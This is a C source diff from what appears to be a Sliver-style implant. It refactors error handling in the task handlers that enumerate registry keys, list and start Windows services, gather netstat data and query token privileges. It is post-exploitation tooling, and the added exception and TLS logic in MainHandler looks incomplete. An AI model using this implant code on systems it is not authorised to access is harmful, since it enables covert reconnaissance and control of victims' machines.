+		LOG_ERROR("RegQueryInfoKeyA", Status);
 		goto CLEANUP;
 	}
 
@@ -2874,7 +2798,7 @@ PENVELOPE RegistrySubKeysListHandler
 			pSubKeys[i]->pBuffer = REALLOC(pSubKeys[i]->pBuffer, pSubKeys[i]->cbBuffer);
 			Status = RegEnumKeyExA(hKey, i, pSubKeys[i]->pBuffer, &pSubKeys[i]->cbBuffer, NULL, NULL, NULL, NULL);
 			if (Status != ERROR_SUCCESS) {
-				lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+				LOG_ERROR("RegEnumKeyExA", Status);
 				goto CLEANUP;
 			}
 		}
@@ -2882,7 +2806,7 @@ PENVELOPE RegistrySubKeysListHandler
 			break;
 		}
 		else if (Status != ERROR_SUCCESS) {
-			lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+			LOG_ERROR("RegEnumKeyExA", Status);
 			goto CLEANUP;
 		}
 
@@ -2898,11 +2822,6 @@ PENVELOPE RegistrySubKeysListHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			FreeBuffer(UnmarshalledData[i]);
@@ -2955,7 +2874,6 @@ PENVELOPE RegistryListValuesHandler
 	HKEY hRootKey = NULL;
 	HKEY hKey = NULL;
 	LSTATUS Status = ERROR_SUCCESS;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement pFinalElement = NULL;
 	DWORD cValues = 0;
 	DWORD dwMaxValueNameLength = 0;
@@ -3001,13 +2919,13 @@ PENVELOPE RegistryListValuesHandler
 
 	Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegOpenKeyExA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegOpenKeyExA", Status);
 		goto CLEANUP;
 	}
 
 	Status = RegQueryInfoKeyA(hKey, NULL, NULL, NULL, NULL, NULL, NULL, &cValues, &dwMaxValueNameLength, NULL, NULL, NULL);
 	if (Status != ERROR_SUCCESS) {
-		lpErrorDesc = CreateFormattedErr(Status, "RegQueryInfoKeyA failed at %s", __FUNCTION__);
+		LOG_ERROR("RegQueryInfoKeyA", Status);
 		goto CLEANUP;
 	}
 
@@ -3022,7 +2940,7 @@ PENVELOPE RegistryListValuesHandler
 			pValues[i]->pBuffer = REALLOC(pValues[i]->pBuffer, pValues[i]->cbBuffer);
 			Status = RegEnumValueA(hKey, i, pValues[i]->pBuffer, &pValues[i]->cbBuffer, NULL, NULL, NULL, NULL);
 			if (Status != ERROR_SUCCESS) {
-				lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+				LOG_ERROR("RegEnumKeyExA", Status);
 				goto CLEANUP;
 			}
 		}
@@ -3030,7 +2948,7 @@ PENVELOPE RegistryListValuesHandler
 			break;
 		}
 		else if (Status != ERROR_SUCCESS) {
-			lpErrorDesc = CreateFormattedErr(Status, "RegEnumKeyExA failed at %s", __FUNCTION__);
+			LOG_ERROR("RegEnumKeyExA", Status);
 			goto CLEANUP;
 		}
 
@@ -3046,11 +2964,6 @@ PENVELOPE RegistryListValuesHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (UnmarshalledData != NULL) {
 		for (i = 0; i < _countof(RecvElementList); i++) {
 			FreeBuffer(UnmarshalledData[i]);
@@ -3103,7 +3016,6 @@ PENVELOPE ServicesHandler
 	SC_HANDLE hService = NULL;
 	DWORD i = 0;
 	SC_HANDLE hScManager = NULL;
-	LPSTR lpErrorDesc = NULL;
 	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
 	DWORD dwBytesNeeded = 0;
 	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
@@ -3115,7 +3027,7 @@ PENVELOPE ServicesHandler
 
 	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
 	if (hScManager == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenSCManagerA failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenSCManagerA", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3165,11 +3077,6 @@ PENVELOPE ServicesHandler
 	pFinalElement->cbMarshalledData = 0;
 
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (hScManager != NULL) {
 		CloseServiceHandle(hScManager);
 	}
@@ -3200,7 +3107,6 @@ PENVELOPE ServiceDetailHandler
 	SC_HANDLE hService = NULL;
 	DWORD i = 0;
 	SC_HANDLE hScManager = NULL;
-	LPSTR lpErrorDesc = NULL;
 	LPQUERY_SERVICE_CONFIGA pServiceConfig = NULL;
 	DWORD dwBytesNeeded = 0;
 	LPSERVICE_DESCRIPTIONA lpServiceDesc = NULL;
@@ -3225,13 +3131,13 @@ PENVELOPE ServiceDetailHandler
 	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
 	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
 	if (hScManager == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenSCManagerA failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenSCManagerA", GetLastError());
 		goto CLEANUP;
 	}
 
 	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
 	if (hService == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenServiceA failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenServiceA", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3240,7 +3146,7 @@ PENVELOPE ServiceDetailHandler
 	cchServiceDisplayName++;
 	lpServiceDisplayName = ALLOC(cchServiceDisplayName);
 	if (!GetServiceDisplayNameA(hScManager, lpServiceName, lpServiceDisplayName, &cchServiceDisplayName)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetServiceDisplayNameA failed at %s", __FUNCTION__);
+		LOG_ERROR("GetServiceDisplayNameA", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3255,7 +3161,7 @@ PENVELOPE ServiceDetailHandler
 
 	SecureZeroMemory(&ServiceStatus, sizeof(ServiceStatus));
 	if (!QueryServiceStatus(hService, &ServiceStatus)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "QueryServiceStatus failed at %s", __FUNCTION__);
+		LOG_ERROR("QueryServiceStatus", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3280,11 +3186,6 @@ PENVELOPE ServiceDetailHandler
 	pFinalElement->cbMarshalledData = 0;
 
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (lpServiceName != NULL) {
 		FREE(lpServiceName);
 	}
@@ -3333,7 +3234,6 @@ PENVELOPE StartServiceByNameHandler
 	SC_HANDLE hService = NULL;
 	DWORD i = 0;
 	SC_HANDLE hScManager = NULL;
-	LPSTR lpErrorDesc = NULL;
 	DWORD dwBytesNeeded = 0;
 	PPBElement RecvElementList[2];
 	LPSTR lpServiceName = NULL;
@@ -3353,29 +3253,24 @@ PENVELOPE StartServiceByNameHandler
 	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
 	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
 	if (hScManager == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenSCManagerA failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenSCManagerA", GetLastError());
 		goto CLEANUP;
 	}
 
 	hService = OpenServiceA(hScManager, lpServiceName, SERVICE_START);
 	if (hService == NULL) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenServiceA failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenServiceA", GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!StartServiceA(hService, 0, NULL)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "StartServiceA failed at %s", __FUNCTION__);
+		LOG_ERROR("StartServiceA", GetLastError());
 		goto CLEANUP;
 	}
 
 	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
 	pRespEnvelope->uID = pEnvelope->uID;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (lpServiceName != NULL) {
 		FREE(lpServiceName);
 	}
@@ -3414,7 +3309,6 @@ PENVELOPE NetstatHandler
 	DWORD dwNumberOfBytesRead = 0;
 	PUINT64 pTemp = NULL;
 	PENVELOPE pRespEnvelope = NULL;
-	LPSTR lpErrorDesc = NULL;
 	DWORD dwReturnedLength = 0;
 	BOOL Tcp = FALSE;
 	BOOL Udp = FALSE;
@@ -3595,11 +3489,6 @@ PENVELOPE NetstatHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	for (i = 0; i < _countof(RecvElementList); i++) {
 		FreeElement(RecvElementList[i]);
 	}
@@ -3627,14 +3516,13 @@ PENVELOPE CurrentTokenOwnerHandler
 {
 	PENVELOPE pRespEnvelope = NULL;
 	DWORD i = 0;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement pFinalElement = NULL;
 	HANDLE hToken = NULL;
 	PTOKEN_USER pTokenUser = NULL;
 	LPSTR lpTokenOwner = NULL;
 	
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcessToken failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenProcessToken", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3645,7 +3533,7 @@ PENVELOPE CurrentTokenOwnerHandler
 
 	lpTokenOwner = LookupNameOfSid(pTokenUser->User.Sid, TRUE);
 	if (lpTokenOwner == NULL) {
-		lpErrorDesc = CreateFormattedErr(0, "Failed to lookup name of SID");
+		LOG_ERROR("LookupNameOfSid", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3658,11 +3546,6 @@ PENVELOPE CurrentTokenOwnerHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (hToken != NULL) {
 		CloseHandle(hToken);
 	}
@@ -3687,7 +3570,6 @@ PENVELOPE GetPrivsHandler
 	PENVELOPE pRespEnvelope = NULL;
 	DWORD i = 0;
 	DWORD j = 0;
-	LPSTR lpErrorDesc = NULL;
 	PPBElement PrivInfo[6];
 	PPBElement RespElement[3];
 	PPBElement* PrivelegeList = NULL;
@@ -3707,13 +3589,13 @@ PENVELOPE GetPrivsHandler
 	PLUID_AND_ATTRIBUTES pPrivilege;
 
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-		lpErrorDesc = CreateFormattedErr(GetLastError(), "OpenProcessToken failed at %s", __FUNCTION__);
+		LOG_ERROR("OpenProcessToken", GetLastError());
 		goto CLEANUP;
 	}
 
 	pTokenPrivileges = GetTokenPrivileges(hToken);
 	if (pTokenPrivileges == NULL) {
-		lpErrorDesc = CreateFormattedErr(0, "Failed to get token privileges");
+		LOG_ERROR("GetTokenPrivileges", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3722,7 +3604,7 @@ PENVELOPE GetPrivsHandler
 	dwReturnedValue = GetModuleFileNameA(NULL, szProcessPath, _countof(szProcessPath));
 	dwLastError = GetLastError();
 	if (dwReturnedValue == 0 || dwLastError == ERROR_INSUFFICIENT_BUFFER) {
-		lpErrorDesc = CreateFormattedErr(dwLastError, "GetModuleFileNameA failed at %s", __FUNCTION__);
+		LOG_ERROR("GetModuleFileNameA", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -3763,11 +3645,6 @@ PENVELOPE GetPrivsHandler
 	pFinalElement->pMarshalledData = NULL;
 	pFinalElement->cbMarshalledData = 0;
 CLEANUP:
-	if (lpErrorDesc != NULL) {
-		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
-		FREE(lpErrorDesc);
-	}
-
 	if (hToken != NULL) {
 		CloseHandle(hToken);
 	}
@@ -3801,7 +3678,12 @@ VOID MainHandler
 {
 	PENVELOPE pResp = NULL;
 	PENVELOPE pEnvelope = NULL;
+	PVOID hException = NULL;
+	LPSTR lpErrorDesc = NULL;
+	DWORD dwTlsIdx = 0;
 
+	dwTlsIdx = TlsAlloc();
+	hException = AddVectoredExceptionHandler(1, ContinuableExceptionHanlder);
 	pEnvelope = pWrapper->pEnvelope;
 	if (pEnvelope->uType == MsgTaskReq) {
 		
@@ -3984,7 +3866,18 @@ VOID MainHandler
 
 	}
 
+	if (pResp == NULL) {
+		lpErrorDesc = TlsGetValue(dwTlsIdx);
+	}
+
 	WriteEnvelope(pWrapper->pSliverClient, pResp);
+
+CLEANUP:
+	if (lpErrorDesc != NULL) {
+		UnmapViewOfFile(lpErrorDesc);
+	}
+
+	RemoveVectoredExceptionHandler(hException);
 	FreeEnvelope(pResp);
 	FreeEnvelope(pEnvelope);
 	FREE(pWrapper);
